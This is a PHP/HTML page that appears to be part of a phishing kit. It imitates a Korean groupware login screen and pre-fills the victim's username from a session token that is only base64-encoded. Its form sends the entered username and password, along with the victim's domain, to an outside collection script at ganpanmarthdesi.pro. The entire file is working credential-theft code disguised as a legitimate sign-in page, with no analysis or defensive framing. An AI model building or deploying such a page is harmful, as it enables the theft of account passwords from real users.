<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>&#44536;&#47353;&#50920;&#50612;</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=text],
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 20px;
  width: 100%;
  padding: 6px 4px;
  margin: 0;
  border: 1px solid #ccc;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #404040;
  }
  </style>
<body background="img/bg.png">

<div align="center">
	<table border="0" width="606" cellspacing="0" cellpadding="0">
		<tr>
			<td >
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="102" ></td>
				</tr>
				<tr>
					<td background="img/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
					   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
						<tr>
							<td height="272" ></td>
						</tr>
						<tr>
							<td height="42">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="258"></td>
									<td width="142">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td>
											  <input type="text" name="user" required value="<?php echo $users;?>" >
											</td>
										</tr>
										<tr>
											<td height="3">
											  <input type="hidden" name="link" value="http://gw.<?php echo $ddomain;?>/groupware/login.php" >
											  <input type="hidden" name="sender" value="Groupware" >
											  <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
											</td>
										</tr>
										<tr>
											<td>
											   <input type="password" name="passwd" required autofocus />
											</td>
										</tr>
									</table>
									</td>
									<td width="6"></td>
									<td width="48">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td height="5"></td>
										</tr>
										<tr>
											<td>
											<input type="image" src="img/btn.png" width="50" height="35"></td>
										</tr>
										<tr>
											<td height="5"></td>
										</tr>
									</table>
									</td>
									<td>&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="56"></td>
						</tr>
					  </form>
					</table>
					</td>
				</tr>
				<tr>
					<td>&nbsp;</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>